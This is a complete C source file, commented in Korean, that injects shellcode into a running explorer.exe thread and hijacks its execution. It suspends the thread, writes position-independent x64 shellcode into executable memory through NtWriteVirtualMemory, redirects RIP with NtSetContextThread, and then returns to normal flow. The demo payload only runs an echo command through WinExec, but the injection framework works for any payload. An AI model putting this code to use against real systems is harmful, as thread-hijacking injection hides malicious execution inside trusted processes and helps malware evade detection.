#include <windows.h>
#include <TlHelp32.h>
#include <wchar.h>

// NT API 함수 포인터 타입 선언
typedef NTSTATUS (NTAPI *NtSetContextThread_t)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);

NtSetContextThread_t pNtSetContextThread = NULL;
NtWriteVirtualMemory_t pNtWriteVirtualMemory = NULL;

// 프로세스 이름으로 PID 찾기 (Unicode 사용)
DWORD findPidByName(const wchar_t* pname)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &procEntry))
    {
        do {
            if (wcscmp(procEntry.szExeFile, pname) == 0)
            {
                pid = procEntry.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &procEntry));
    }
    CloseHandle(hSnap);
    return pid;
}

// =====================
// x86용 쉘코드 (총 74바이트)
// [패치 오프셋: offset 14에 WinExec, offset 31에 원래 EIP]
// 이 코드는 x64 빌드에서는 사용하지 않으므로 주석 처리합니다.
// ---------------------
/*
unsigned char code32[74] = {
    0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, 0xB8, 0x41, 0x41,
    0x41, 0x41, 0x8D, 0x93, 0x24, 0x00, 0x00, 0x00, 0x6A, 0x01, 0x52, 0xFF, 0xD0, 0x61, 0x68, 0x42,
    0x42, 0x42, 0x42, 0xC3, 0x63, 0x6D, 0x64, 0x20, 0x2F, 0x6B, 0x20, 0x65, 0x63, 0x68, 0x6F, 0x20,
    0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x69, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E,
    0x20, 0x46, 0x69, 0x6E, 0x69, 0x73, 0x68, 0x65, 0x64, 0x21
};
*/

// =====================
// x64용 쉘코드 예제 (총 87바이트)
// [패치 오프셋: offset 0x20에 WinExec, offset 0x28에 원래 RIP]
// ---------------------
unsigned char code64[87] = {
    // --- 코드 영역 (0 ~ 31바이트) ---
    0x48, 0x8D, 0x0D, 0x29, 0x00, 0x00, 0x00,             // lea rcx, [rip+0x29] → rcx = 명령 문자열 주소
    0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,             // mov rdx, 1 → rdx = 1 (SW_SHOWNORMAL)
    0x48, 0x8B, 0x05, 0x0B, 0x00, 0x00, 0x00,             // mov rax, [rip+0x0B] → rax = WinExec 주소 (데이터 영역의 offset 0x20에 패치)
    0xFF, 0xD0,                                         // call rax → WinExec 호출
    0x48, 0x8B, 0x05, 0x0A, 0x00, 0x00, 0x00,             // mov rax, [rip+0x0A] → rax = 원래 RIP (데이터 영역의 offset 0x28에 패치)
    0xFF, 0xE0,                                         // jmp rax → 원래 실행 흐름 복귀
    // --- 데이터 영역 (32 ~ 86바이트) ---
    // offset 0x20: WinExec 주소 패치용 (8바이트)
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
    // offset 0x28: 원래 RIP 값 패치용 (8바이트)
    0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
    // offset 0x30: 명령 문자열 "cmd /k echo Thread Injection Finished!\0"
    0x63, 0x6D, 0x64, 0x20, 0x2F, 0x6B, 0x20, 0x65,
    0x63, 0x68, 0x6F, 0x20, 0x54, 0x68, 0x72, 0x65,
    0x61, 0x64, 0x20, 0x49, 0x6E, 0x6A, 0x65, 0x63,
    0x74, 0x69, 0x6F, 0x6E, 0x20, 0x46, 0x69, 0x6E,
    0x69, 0x73, 0x68, 0x65, 0x64, 0x21, 0x00
};

int main()
{
    // explorer.exe의 PID 찾기
    DWORD dwProcessId = findPidByName(L"explorer.exe");
    if (dwProcessId == 0)
        return 1;

    // ntdll.dll에서 NtSetContextThread, NtWriteVirtualMemory 동적 로딩
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll)
        return 1;
    pNtSetContextThread = (NtSetContextThread_t)GetProcAddress(hNtdll, "NtSetContextThread");
    pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    if (!pNtSetContextThread || !pNtWriteVirtualMemory)
        return 1;

    // 대상 프로세스 열기
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION |
        PROCESS_CREATE_THREAD |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE,
        FALSE, dwProcessId);
    if (hProcess == NULL)
        return 1;

    // 대상 프로세스의 스레드 하나 찾기
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hProcess);
        return 1;
    }
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    BOOL found = FALSE;
    if (Thread32First(hSnap, &te32))
    {
        do {
            if (te32.th32OwnerProcessID == dwProcessId)
            {
                found = TRUE;
                break;
            }
        } while (Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if (!found)
    {
        CloseHandle(hProcess);
        return 1;
    }
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
    if (!hThread)
    {
        CloseHandle(hProcess);
        return 1;
    }

    // 스레드 중단 및 컨텍스트 얻기
    SuspendThread(hThread);
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx))
    {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // kernel32.dll에서 WinExec 주소 얻기
    FARPROC pWinExec = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WinExec");
    if (!pWinExec)
    {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // ================================
    // 쉘코드 선택 (원하는 버전을 사용하도록 아래 블록에서 한 쪽을 주석 처리)
    // -------------------------------
    // [x86 인젝션용] - 주석 처리 (x64 빌드에서는 사용하지 않음)
    /*
    unsigned char *shellcode = code32;
    SIZE_T shellcodeSize = sizeof(code32);
    *(PDWORD)(shellcode + 14) = (DWORD)pWinExec;
    *(PDWORD)(shellcode + 31) = (DWORD)ctx.Eip;
    */

    // [x64 인젝션용] - 활성화된 버전
    unsigned char *shellcode = code64;
    SIZE_T shellcodeSize = sizeof(code64);
    // x64 쉘코드의 패치 오프셋: offset 0x20에 WinExec, offset 0x28에 원래 RIP
    *(PULONG_PTR)(shellcode + 0x20) = (ULONG_PTR)pWinExec;
    *(PULONG_PTR)(shellcode + 0x28) = (ULONG_PTR)ctx.Rip;
    // ================================

    // 대상 프로세스에 실행 권한으로 메모리 할당
    PVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem)
    {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // NtWriteVirtualMemory를 사용해 할당한 메모리에 쉘코드 기록
    if (pNtWriteVirtualMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL) != 0)
    {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // 스레드 컨텍스트 수정: 실행 흐름을 인젝션한 쉘코드로 변경 (x64에서는 Rip 사용)
    ctx.Rip = (DWORD64)remoteMem;
    if (pNtSetContextThread(hThread, &ctx) != 0)
    {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // 대상 스레드 재개 및 핸들 정리
    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
